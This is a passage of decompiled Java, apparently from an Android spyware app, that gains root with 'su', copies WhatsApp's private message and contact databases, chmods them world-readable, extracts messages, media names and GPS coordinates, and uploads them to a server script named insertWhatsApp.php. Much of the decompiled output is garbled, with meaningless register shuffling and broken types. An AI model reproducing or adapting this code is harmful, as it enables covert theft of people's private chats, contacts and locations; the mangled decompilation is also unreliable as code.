                                                                            }
                                                                        } catch (Exception e8) {
                                                                            e = e8;
                                                                            r2210 = r2212;
                                                                            r44 = string6;
                                                                            e.getStackTrace();
                                                                            r186 = r187;
                                                                            r229 = r2212;
                                                                            r43 = string6;
                                                                            aVar2.a();
                                                                            r62 = r65;
                                                                            r225 = r229;
                                                                            r182 = r186;
                                                                            r4 = r43;
                                                                            r202 = r4;
                                                                            r224 = r225;
                                                                            r18 = r182;
                                                                            r6 = r62;
                                                                            if (i == 0) {
                                                                            }
                                                                            r03 = r27;
                                                                            r17 = r8;
                                                                            r52 = r18;
                                                                            r22 = r202;
                                                                            r245 = r247;
                                                                            r23 = r232;
                                                                            Context context42222 = context;
                                                                            d2 = simpleDateFormat;
                                                                            str6 = str3;
                                                                            r102 = r23;
                                                                            i2 = r245;
                                                                            r243 = r245;
                                                                            r5 = r52;
                                                                            r2 = r22;
                                                                            r1 = r17;
                                                                            r0 = r03;
                                                                            r103 = r10;
                                                                            r72 = r7;
                                                                            r53 = r5;
                                                                            r25 = r2;
                                                                            r19 = r1;
                                                                            r04 = r0;
                                                                        }
                                                                    } catch (Exception e9) {
                                                                        e = e9;
                                                                        r2211 = r72;
                                                                        r63 = r65;
                                                                        r183 = r187;
                                                                        r42 = string;
                                                                        r226 = r2211;
                                                                        r246 = r243;
                                                                        r95 = r93;
                                                                        r223 = r226;
                                                                        e.getMessage();
                                                                        r223 = r226;
                                                                        e.getStackTrace();
                                                                        Crashlytics.logException(e);
                                                                        r225 = r226;
                                                                        r182 = r183;
                                                                        r62 = r63;
                                                                        r4 = r42;
                                                                        r202 = r4;
                                                                        r224 = r225;
                                                                        r18 = r182;
                                                                        r6 = r62;
                                                                        if (i == 0) {
                                                                        }
                                                                        r03 = r27;
                                                                        r17 = r8;
                                                                        r52 = r18;
                                                                        r22 = r202;
                                                                        r245 = r247;
                                                                        r23 = r232;
                                                                        Context context422222 = context;
                                                                        d2 = simpleDateFormat;
                                                                        str6 = str3;
                                                                        r102 = r23;
                                                                        i2 = r245;
                                                                        r243 = r245;
                                                                        r5 = r52;
                                                                        r2 = r22;
                                                                        r1 = r17;
                                                                        r0 = r03;
                                                                        r103 = r10;
                                                                        r72 = r7;
                                                                        r53 = r5;
                                                                        r25 = r2;
                                                                        r19 = r1;
                                                                        r04 = r0;
                                                                    }
                                                                }
                                                                aVar2.a();
                                                                r62 = r65;
                                                                r225 = r229;
                                                                r182 = r186;
                                                                r4 = r43;
                                                            } catch (Exception e10) {
                                                                e = e10;
                                                                r185 = r46;
                                                                r228 = r72;
                                                                r64 = r65;
                                                                r184 = r185;
                                                                r42 = r20;
                                                                r226 = r227;
                                                                r183 = r184;
                                                                r63 = r64;
                                                                r246 = r243;
                                                                r95 = r93;
                                                                r223 = r226;
                                                                e.getMessage();
                                                                r223 = r226;
                                                                e.getStackTrace();
                                                                Crashlytics.logException(e);
                                                                r225 = r226;
                                                                r182 = r183;
                                                                r62 = r63;
                                                                r4 = r42;
                                                                r202 = r4;
                                                                r224 = r225;
                                                                r18 = r182;
                                                                r6 = r62;
                                                                if (i == 0) {
                                                                }
                                                                r03 = r27;
                                                                r17 = r8;
                                                                r52 = r18;
                                                                r22 = r202;
                                                                r245 = r247;
                                                                r23 = r232;
                                                                Context context4222222 = context;
                                                                d2 = simpleDateFormat;
                                                                str6 = str3;
                                                                r102 = r23;
                                                                i2 = r245;
                                                                r243 = r245;
                                                                r5 = r52;
                                                                r2 = r22;
                                                                r1 = r17;
                                                                r0 = r03;
                                                                r103 = r10;
                                                                r72 = r7;
                                                                r53 = r5;
                                                                r25 = r2;
                                                                r19 = r1;
                                                                r04 = r0;
                                                            }
                                                        } catch (Exception e11) {
                                                            e = e11;
                                                            r184 = r46;
                                                            r64 = r222;
                                                            r228 = r72;
                                                            r42 = r20;
                                                            r226 = r227;
                                                            r183 = r184;
                                                            r63 = r64;
                                                            r246 = r243;
                                                            r95 = r93;
                                                            r223 = r226;
                                                            e.getMessage();
                                                            r223 = r226;
                                                            e.getStackTrace();
                                                            Crashlytics.logException(e);
                                                            r225 = r226;
                                                            r182 = r183;
                                                            r62 = r63;
                                                            r4 = r42;
                                                            r202 = r4;
                                                            r224 = r225;
                                                            r18 = r182;
                                                            r6 = r62;
                                                            if (i == 0) {
                                                            }
                                                            r03 = r27;
                                                            r17 = r8;
                                                            r52 = r18;
                                                            r22 = r202;
                                                            r245 = r247;
                                                            r23 = r232;
                                                            Context context42222222 = context;
                                                            d2 = simpleDateFormat;
                                                            str6 = str3;
                                                            r102 = r23;
                                                            i2 = r245;
                                                            r243 = r245;
                                                            r5 = r52;
                                                            r2 = r22;
                                                            r1 = r17;
                                                            r0 = r03;
                                                            r103 = r10;
                                                            r72 = r7;
                                                            r53 = r5;
                                                            r25 = r2;
                                                            r19 = r1;
                                                            r04 = r0;
                                                        }
                                                    } catch (Exception e12) {
                                                        e = e12;
                                                        Context context5 = context;
                                                        String str16 = str2;
                                                        r184 = r46;
                                                        r64 = r222;
                                                        r228 = r72;
                                                        r42 = r20;
                                                        r226 = r227;
                                                        r183 = r184;
                                                        r63 = r64;
                                                        r246 = r243;
                                                        r95 = r93;
                                                        r223 = r226;
                                                        e.getMessage();
                                                        r223 = r226;
                                                        e.getStackTrace();
                                                        Crashlytics.logException(e);
                                                        r225 = r226;
                                                        r182 = r183;
                                                        r62 = r63;
                                                        r4 = r42;
                                                        r202 = r4;
                                                        r224 = r225;
                                                        r18 = r182;
                                                        r6 = r62;
                                                        if (i == 0) {
                                                        }
                                                        r03 = r27;
                                                        r17 = r8;
                                                        r52 = r18;
                                                        r22 = r202;
                                                        r245 = r247;
                                                        r23 = r232;
                                                        Context context422222222 = context;
                                                        d2 = simpleDateFormat;
                                                        str6 = str3;
                                                        r102 = r23;
                                                        i2 = r245;
                                                        r243 = r245;
                                                        r5 = r52;
                                                        r2 = r22;
                                                        r1 = r17;
                                                        r0 = r03;
                                                        r103 = r10;
                                                        r72 = r7;
                                                        r53 = r5;
                                                        r25 = r2;
                                                        r19 = r1;
                                                        r04 = r0;
                                                    }
                                                    r202 = r4;
                                                    r224 = r225;
                                                    r18 = r182;
                                                    r6 = r62;
                                                } else {
                                                    Context context6 = context;
                                                    String str17 = str2;
                                                    r18 = r46;
                                                    r6 = r222;
                                                    r224 = r72;
                                                    r202 = r20;
                                                }
                                            } else {
                                                Context context7 = context;
                                                String str18 = str2;
                                                str5 = str4;
                                                r6 = r222;
                                                r18 = r46;
                                                r224 = r72;
                                                r202 = r20;
                                            }
                                            if (i == 0) {
                                                r223 = r224;
                                                SimpleDateFormat simpleDateFormat4 = simpleDateFormat2;
                                                r223 = r224;
                                                r27 = r93;
                                                str3 = str5;
                                                r95 = r292;
                                                r232 = r6;
                                                simpleDateFormat = simpleDateFormat4;
                                                r244 = r224;
                                                try {
                                                    r246 = r244;
                                                    a(context, r202, r8, "1", simpleDateFormat4.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertWhatsApp.php");
                                                    r247 = r244;
                                                } catch (Exception e13) {
                                                    e = e13;
                                                    r242 = r246;
                                                    r92 = r95;
                                                    e.getStackTrace();
                                                    e.getStackTrace();
                                                    Crashlytics.logException(e);
                                                    r24 = r242;
                                                    r9 = r92;
                                                    if (r9 != 0) {
                                                    }
                                                    a(aVar, r24);
                                                    return;
                                                }
                                            } else {
                                                r232 = r6;
                                                r27 = r93;
                                                simpleDateFormat = simpleDateFormat2;
                                                r247 = r224;
                                                str3 = str5;
                                                ? r96 = r292;
                                                a(context, r202, r8, "2", simpleDateFormat.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertWhatsApp.php");
                                            }
                                            r03 = r27;
                                            r17 = r8;
                                            r52 = r18;
                                            r22 = r202;
                                            r245 = r247;
                                            r23 = r232;
                                        } else {
                                            if (i3 == 1) {
                                                r14 = "<i class='fa fa-file-image-o''></i>";
                                                try {
                                                    Cursor a4 = aVar.a(str15, str14, string2);
                                                    if (!(a4 == null || a4.getCount() == 0)) {
                                                        a4.moveToFirst();
                                                        String string7 = a4.getString(a4.getColumnIndexOrThrow(str13));
                                                        if (string7 != null && !string7.isEmpty()) {
                                                            StringBuilder sb4 = new StringBuilder();
                                                            sb4.append(r14);
                                                            sb4.append(str12);
                                                            sb4.append(string7);
                                                            r14 = sb4.toString();
                                                        }
                                                    }
                                                    String string8 = r72.getString(r72.getColumnIndexOrThrow(str11));
                                                    if (string8 != null && !string8.isEmpty()) {
                                                        StringBuilder sb5 = new StringBuilder();
                                                        sb5.append(r14);
                                                        sb5.append(str8);
                                                        sb5.append(string8);
                                                        sb5.append(str7);
                                                        r14 = sb5.toString();
                                                    }
                                                } catch (Exception e14) {
                                                    try {
                                                        r15 = r14;
                                                        e14.getStackTrace();
                                                        r14 = r14;
                                                        r15 = r14;
                                                    } catch (Exception e15) {
                                                        e = e15;
                                                        str4 = str6;
                                                        r13 = r15;
                                                    }
                                                }
                                            } else if (i3 == 2) {
                                                r14 = "<i class='fa fa-file-audio-o''></i>";
                                                try {
                                                    Cursor a5 = aVar.a(str15, str14, string2);
                                                    if (!(a5 == null || a5.getCount() == 0)) {
                                                        a5.moveToFirst();
                                                        String string9 = a5.getString(a5.getColumnIndexOrThrow(str13));
                                                        if (string9 != null && !string9.isEmpty()) {
                                                            StringBuilder sb6 = new StringBuilder();
                                                            sb6.append(r14);
                                                            sb6.append(str12);
                                                            sb6.append(string9);
                                                            r14 = sb6.toString();
                                                        }
                                                    }
                                                } catch (Exception e16) {
                                                    r15 = r14;
                                                    e16.getStackTrace();
                                                    r15 = r14;
                                                    r14 = r14;
                                                }
                                            } else {
                                                str4 = str6;
                                                String str19 = "media_name";
                                                if (i3 == 9) {
                                                    ? r111 = "<i class='fa fa-file-o''></i>";
                                                    try {
                                                        Cursor a6 = aVar.a(str15, str14, string2);
                                                        if (!(a6 == null || a6.getCount() == 0)) {
                                                            a6.moveToFirst();
                                                            String string10 = a6.getString(a6.getColumnIndexOrThrow(str13));
                                                            if (string10 != null && !string10.isEmpty()) {
                                                                StringBuilder sb7 = new StringBuilder();
                                                                sb7.append(r111);
                                                                sb7.append(str12);
                                                                sb7.append(string10);
                                                                r111 = sb7.toString();
                                                            }
                                                        }
                                                        String string11 = r72.getString(r72.getColumnIndexOrThrow(str19));
                                                        if (string11 == null || string11.isEmpty()) {
                                                            String string12 = r72.getString(r72.getColumnIndexOrThrow(str11));
                                                            if (string12 != null && !string12.isEmpty()) {
                                                                StringBuilder sb8 = new StringBuilder();
                                                                sb8.append(r12);
                                                                sb8.append(str8);
                                                                sb8.append(string12);
                                                                sb8.append(str7);
                                                                r02 = sb8.toString();
                                                            }
                                                            ? r82 = r12;
                                                            i = r72.getInt(r72.getColumnIndexOrThrow("key_from_me"));
                                                            r93 = r72.getString(r72.getColumnIndexOrThrow("key_remote_jid"));
                                                            date.setTime(r46);
                                                            if (r93 == 0) {
                                                            }
                                                            if (i == 0) {
                                                            }
                                                            r03 = r27;
                                                            r17 = r82;
                                                            r52 = r18;
                                                            r22 = r202;
                                                            r245 = r247;
                                                            r23 = r232;
                                                        } else {
                                                            StringBuilder sb9 = new StringBuilder();
                                                            sb9.append(r12);
                                                            sb9.append(str8);
                                                            sb9.append(string11);
                                                            sb9.append(str7);
                                                            r02 = sb9.toString();
                                                        }
                                                    } catch (Exception e17) {
                                                        try {
                                                            r12 = r111;
                                                            e17.getStackTrace();
                                                            r12 = r111;
                                                            r12 = r111;
                                                        } catch (Exception e18) {
                                                            e = e18;
                                                            r20 = r20;
                                                            r222 = r222;
                                                            r13 = r12;
                                                        }
                                                    }
                                                } else if (i3 == 5) {
                                                    ? r112 = "<i class='fa fa-map-o''></i>";
                                                    r12 = r112;
                                                    String string13 = r72.getString(r72.getColumnIndexOrThrow("latitude"));
                                                    String string14 = r72.getString(r72.getColumnIndexOrThrow("longitude"));
                                                    StringBuilder sb10 = new StringBuilder();
                                                    sb10.append(r112);
                                                    sb10.append(str8);
                                                    sb10.append(string13);
                                                    sb10.append(", ");
                                                    sb10.append(string14);
                                                    sb10.append(str7);
                                                    r12 = sb10.toString();
                                                    ? r822 = r12;
                                                    i = r72.getInt(r72.getColumnIndexOrThrow("key_from_me"));
                                                    r93 = r72.getString(r72.getColumnIndexOrThrow("key_remote_jid"));
                                                    date.setTime(r46);
                                                    if (r93 == 0) {
                                                    }
                                                    if (i == 0) {
                                                    }
                                                    r03 = r27;
                                                    r17 = r822;
                                                    r52 = r18;
                                                    r22 = r202;
                                                    r245 = r247;
                                                    r23 = r232;
                                                } else {
                                                    try {
                                                        r12 = r72.getString(r72.getColumnIndexOrThrow("data"));
                                                        if (r12 != 0) {
                                                        }
                                                        try {
                                                            Cursor a7 = aVar.a(str15, str14, string2);
                                                            if (!(a7 == null || a7.getCount() == 0)) {
                                                                a7.moveToFirst();
                                                                String string15 = a7.getString(a7.getColumnIndexOrThrow(str13));
                                                                if (string15 != null && !string15.isEmpty()) {
                                                                    StringBuilder sb11 = new StringBuilder();
                                                                    sb11.append(r12);
                                                                    sb11.append(str12);
                                                                    sb11.append(string15);
                                                                    r12 = sb11.toString();
                                                                }
                                                            }
                                                            String string16 = r72.getString(r72.getColumnIndexOrThrow(str11));
                                                            if (string16 != null && !string16.isEmpty()) {
                                                                StringBuilder sb12 = new StringBuilder();
                                                                sb12.append(r12);
                                                                sb12.append(str8);
                                                                sb12.append(string16);
                                                                sb12.append(str7);
                                                                r12 = sb12.toString();
                                                            }
                                                        } catch (Exception e19) {
                                                            r12 = r12;
                                                            e19.getStackTrace();
                                                            r12 = r12;
                                                        }
                                                        if (r12 == 0 || r12.isEmpty()) {
                                                            r12 = r72.getString(r72.getColumnIndexOrThrow("media_mime_type"));
                                                            if (r12 == 0 || r12.isEmpty()) {
                                                                r12 = r72.getString(r72.getColumnIndexOrThrow(str19));
                                                                if (r12 == 0 || r12.isEmpty()) {
                                                                    r12 = r72.getString(r72.getColumnIndexOrThrow("media_url"));
                                                                }
                                                            }
                                                        }
                                                    } catch (Exception e20) {
                                                        e = e20;
                                                        r13 = r172;
                                                        r222 = r222;
                                                        r20 = r20;
                                                        e.getStackTrace();
                                                        r222 = r222;
                                                        r20 = r20;
                                                        r12 = r13;
                                                        ? r8222 = r12;
                                                        i = r72.getInt(r72.getColumnIndexOrThrow("key_from_me"));
                                                        r93 = r72.getString(r72.getColumnIndexOrThrow("key_remote_jid"));
                                                        date.setTime(r46);
                                                        if (r93 == 0) {
                                                        }
                                                        if (i == 0) {
                                                        }
                                                        r03 = r27;
                                                        r17 = r8222;
                                                        r52 = r18;
                                                        r22 = r202;
                                                        r245 = r247;
                                                        r23 = r232;
                                                        Context context4222222222 = context;
                                                        d2 = simpleDateFormat;
                                                        str6 = str3;
                                                        r102 = r23;
                                                        i2 = r245;
                                                        r243 = r245;
                                                        r5 = r52;
                                                        r2 = r22;
                                                        r1 = r17;
                                                        r0 = r03;
                                                        r103 = r10;
                                                        r72 = r7;
                                                        r53 = r5;
                                                        r25 = r2;
                                                        r19 = r1;
                                                        r04 = r0;
                                                    }
                                                    ? r82222 = r12;
                                                    i = r72.getInt(r72.getColumnIndexOrThrow("key_from_me"));
                                                    r93 = r72.getString(r72.getColumnIndexOrThrow("key_remote_jid"));
                                                    date.setTime(r46);
                                                    if (r93 == 0) {
                                                    }
                                                    if (i == 0) {
                                                    }
                                                    r03 = r27;
                                                    r17 = r82222;
                                                    r52 = r18;
                                                    r22 = r202;
                                                    r245 = r247;
                                                    r23 = r232;
                                                }
                                            }
                                            str4 = str6;
                                            r12 = r14;
                                            ? r822222 = r12;
                                            i = r72.getInt(r72.getColumnIndexOrThrow("key_from_me"));
                                            r93 = r72.getString(r72.getColumnIndexOrThrow("key_remote_jid"));
                                            date.setTime(r46);
                                            if (r93 == 0) {
                                            }
                                            if (i == 0) {
                                            }
                                            r03 = r27;
                                            r17 = r822222;
                                            r52 = r18;
                                            r22 = r202;
                                            r245 = r247;
                                            r23 = r232;
                                        }
                                        r12 = r02;
                                    } catch (Exception e21) {
                                        e = e21;
                                        r20 = r25;
                                        r222 = r103;
                                        str4 = str6;
                                        simpleDateFormat2 = d2;
                                        r13 = r172;
                                        r222 = r222;
                                        r20 = r20;
                                        e.getStackTrace();
                                        r222 = r222;
                                        r20 = r20;
                                        r12 = r13;
                                        ? r8222222 = r12;
                                        i = r72.getInt(r72.getColumnIndexOrThrow("key_from_me"));
                                        r93 = r72.getString(r72.getColumnIndexOrThrow("key_remote_jid"));
                                        date.setTime(r46);
                                        if (r93 == 0) {
                                        }
                                        if (i == 0) {
                                        }
                                        r03 = r27;
                                        r17 = r8222222;
                                        r52 = r18;
                                        r22 = r202;
                                        r245 = r247;
                                        r23 = r232;
                                        Context context42222222222 = context;
                                        d2 = simpleDateFormat;
                                        str6 = str3;
                                        r102 = r23;
                                        i2 = r245;
                                        r243 = r245;
                                        r5 = r52;
                                        r2 = r22;
                                        r1 = r17;
                                        r0 = r03;
                                        r103 = r10;
                                        r72 = r7;
                                        r53 = r5;
                                        r25 = r2;
                                        r19 = r1;
                                        r04 = r0;
                                    }
                                    ? r82222222 = r12;
                                    i = r72.getInt(r72.getColumnIndexOrThrow("key_from_me"));
                                    r93 = r72.getString(r72.getColumnIndexOrThrow("key_remote_jid"));
                                    date.setTime(r46);
                                    if (r93 == 0) {
                                    }
                                    if (i == 0) {
                                    }
                                    r03 = r27;
                                    r17 = r82222222;
                                    r52 = r18;
                                    r22 = r202;
                                    r245 = r247;
                                    r23 = r232;
                                } else {
                                    ? r203 = r25;
                                    r245 = r72;
                                    r23 = r103;
                                    str3 = str6;
                                    simpleDateFormat = d2;
                                    String str20 = str2;
                                    r52 = r292;
                                    r03 = r162;
                                    r17 = r172;
                                    r22 = r25;
                                }
                                Context context422222222222 = context;
                                d2 = simpleDateFormat;
                                str6 = str3;
                                r102 = r23;
                                i2 = r245;
                                r243 = r245;
                                r5 = r52;
                                r2 = r22;
                                r1 = r17;
                                r0 = r03;
                            } catch (Exception e22) {
                                e = e22;
                                r94 = r292;
                                r242 = r72;
                                r92 = r93;
                                e.getStackTrace();
                                e.getStackTrace();
                                Crashlytics.logException(e);
                                r24 = r242;
                                r9 = r92;
                                if (r9 != 0) {
                                }
                                a(aVar, r24);
                                return;
                            }
                        }
                        r103 = r10;
                        r72 = r7;
                        r53 = r5;
                        r25 = r2;
                        r19 = r1;
                        r04 = r0;
                    } catch (Exception e23) {
                        e = e23;
                        r94 = r53;
                        r242 = r72;
                        r92 = r93;
                        e.getStackTrace();
                        e.getStackTrace();
                        Crashlytics.logException(e);
                        r24 = r242;
                        r9 = r92;
                        if (r9 != 0) {
                        }
                        a(aVar, r24);
                        return;
                    }
                }
                r9 = r53;
                r24 = r72;
                if (r9 != 0) {
                    Editor edit = MyApp.b().getSharedPreferences("user", 0).edit();
                    edit.putLong("timewhatsapp", r9);
                    edit.apply();
                }
                a(aVar, r24);
                return;
            }
        }
    }

    public void run() {
        String str = "msgstore.db-shm";
        String str2 = "msgstore.db-wal";
        String str3 = "msgstore.db";
        String str4 = " > ";
        String str5 = "/data/data/com.whatsapp/databases/";
        String str6 = "cat ";
        String str7 = "\n";
        try {
            Thread.sleep(500);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        if (f171b) {
            a(this.f172a);
            return;
        }
        f171b = true;
        try {
            if (e.v(this.f172a) == 0) {
                a.c.e.c.j(this.f172a);
            }
            if (e.v(this.f172a) != 0) {
                long v = e.v(this.f172a);
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append(str6);
                sb.append(str5);
                sb.append(str3);
                sb.append(str4);
                sb.append(a.c.e.c.a());
                sb.append(str3);
                sb.append(str7);
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append(str6);
                sb2.append(str5);
                sb2.append(str2);
                sb2.append(str4);
                sb2.append(a.c.e.c.a());
                sb2.append(str2);
                sb2.append(str7);
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append(str6);
                sb3.append(str5);
                sb3.append(str);
                sb3.append(str4);
                sb3.append(a.c.e.c.a());
                sb3.append(str);
                sb3.append(str7);
                dataOutputStream.writeBytes(sb3.toString());
                StringBuilder sb4 = new StringBuilder();
                sb4.append(str6);
                sb4.append(str5);
                sb4.append("wa.db");
                sb4.append(str4);
                sb4.append(a.c.e.c.a());
                sb4.append("WhatsAppContacts.db");
                sb4.append(str7);
                dataOutputStream.writeBytes(sb4.toString());
                StringBuilder sb5 = new StringBuilder();
                sb5.append("chmod 777 ");
                sb5.append(a.c.e.c.a());
                sb5.append("* \n");
                dataOutputStream.writeBytes(sb5.toString());
                StringBuilder sb6 = new StringBuilder();
                sb6.append("chmod -R 777 ");
                sb6.append(a.c.e.c.a());
                sb6.append(str7);
                dataOutputStream.writeBytes(sb6.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                a.c.e.c.a(this.f172a, str3);
                a(this.f172a, "msgstore.db", "WhatsAppContacts.db", v);
            }
        } catch (Exception e3) {
            e3.getStackTrace();
            try {
                e3.getStackTrace();
                Crashlytics.logException(e3);
            } catch (Exception unused) {
            }
        }
        f171b = false;
        a(this.f172a);
    }
}
